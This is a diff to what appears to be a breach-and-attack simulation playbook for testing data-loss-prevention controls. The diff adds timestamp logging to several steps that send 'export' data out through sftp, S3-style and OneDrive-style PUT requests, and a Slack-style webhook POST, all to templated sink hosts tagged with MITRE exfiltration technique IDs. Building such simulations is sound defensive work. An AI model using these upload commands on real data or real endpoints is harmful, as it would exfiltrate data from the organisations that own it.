@@ -89,6 +89,7 @@ steps:
       $batchFile = New-TemporaryFile
       "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
         $exitCode = $LASTEXITCODE
         Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
@@ -132,6 +133,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bi-exports/$token.dat"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $exportContent `
           -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
           -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
@@ -173,6 +175,7 @@ steps:
       $token = "{{SINK_TOKEN}}"
       $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Put -Body $exportContent -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
         Write-Output "EXEC T1567.002: CRM/ERP-report-shaped OneDrive upload completed (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-CRM]"
@@ -210,6 +213,7 @@ steps:
       $body = @{ text = "$token`n$exportContent" } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
         Write-Output "EXEC T1567.004: Data-warehouse-unload-shaped webhook export completed (see sink verification for the actual verdict). [BAS-SIM-DLP-DBEXPORT-WAREHOUSE]"
